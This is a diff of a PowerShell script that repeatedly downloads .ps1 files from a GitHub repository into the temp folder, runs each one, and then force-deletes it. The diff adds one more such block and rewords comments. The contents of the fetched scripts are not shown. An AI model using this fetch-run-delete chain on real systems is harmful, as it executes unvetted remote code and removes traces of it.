@@ -8,7 +8,7 @@ Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/3reb0s/Powershell-Scri
 # Execute the downloaded script
 & $tempFile
 
-# Optionally, clean up by removing the downloaded script file
+# Clean up by removing the downloaded script file
 Remove-Item -Path $tempFile -Force
 
 # Download the script and store it in a temporary file
@@ -19,7 +19,7 @@ Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/3reb0s/Powershell-Scri
 & $tempFile
 
 
-# Optionally, clean up by removing the downloaded script file
+# Clean up by removing the downloaded script file
 Remove-Item -Path $tempFile -Force
 
 # Download the script and store it in a temporary file
@@ -35,5 +35,11 @@ Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/3reb0s/Powershell-Scri
 & $tempFile
 
 
-# Optionally, clean up by removing the downloaded script file
+# Clean up by removing the downloaded script file
+Remove-Item -Path $tempFile -Force
+
+#You get the Idea
+$tempFile = "$env:TEMP\DVP.ps1"
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/3reb0s/Powershell-Scripts/refs/heads/main/Here_is_your_sign.ps1' -OutFile $tempFile
+& $tempFile
 Remove-Item -Path $tempFile -Force
